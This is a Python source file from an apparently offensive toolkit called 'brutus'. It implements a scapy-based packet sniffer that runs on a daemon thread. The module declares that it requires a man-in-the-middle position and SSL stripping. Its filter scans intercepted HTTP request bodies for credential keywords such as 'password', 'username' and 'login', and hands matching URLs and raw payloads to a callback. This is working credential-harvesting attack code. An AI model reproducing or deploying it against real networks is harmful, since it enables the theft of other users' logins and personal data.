"""This module exposes a packet sniffer API
"""
from time import sleep
from typing import Callable

import scapy.all as scapy  # type: ignore
from scapy.layers.http import HTTPRequest  # type: ignore

from brutus.models.BaseBrutusModule import BaseBrutusModule
from brutus.tasking.CancellableThread import CancellableThread


class PacketSniffer(BaseBrutusModule, CancellableThread):
    """Implements a basic packet sniffer on a cancellable daemon thread

    Interface:
        BaseBrutusModule
        CancellableThread
    """

    def __init__(self, interface: str, callback: Callable):
        self.interface = interface
        self.callback = callback
        self.socket = None

        BaseBrutusModule.__init__(
            self,
            requires_mitm_state=True,
            strip_ssl=True,
            module_path='brutus.interfaces.packet_sniffer.inquirer',
        )

        CancellableThread.__init__(self, daemon=True, callback=self.sniffer_routine)

    def sniffer_routine(self):
        """Thread routine, runs scapy's `sniff` op"""
        try:
            scapy.sniff(
                iface=self.interface,
                store=False,
                prn=self.filter,
                count=100,
                stop_filter=self.is_cancelled,
            )
        except PermissionError:
            pass  # TODO logging, handling

    def filter(self, packet: scapy.packet.Packet):
        """Scapy filter; passed to the scapy `sniff` API

        Args:
            packet (scapy.packet.Packet)
        """
        if packet.haslayer(HTTPRequest):
            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()

            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load.decode()
                keywords = [
                    'username',
                    'user',
                    'password',
                    'pass',
                    'login',
                    'signup',
                    'email',
                    'credential',
                    'name',
                ]
                for keyword in keywords:
                    if keyword in load:
                        self.callback((url, str(load)))

    def start_sniff(self):
        """Initialize the sniffer thread such that
        a SIGINT cancels the routine
        """
        self.start()  # start the thread routine

        try:
            while True:
                sleep(100)
        except KeyboardInterrupt:
            self.join_thread(2.0)
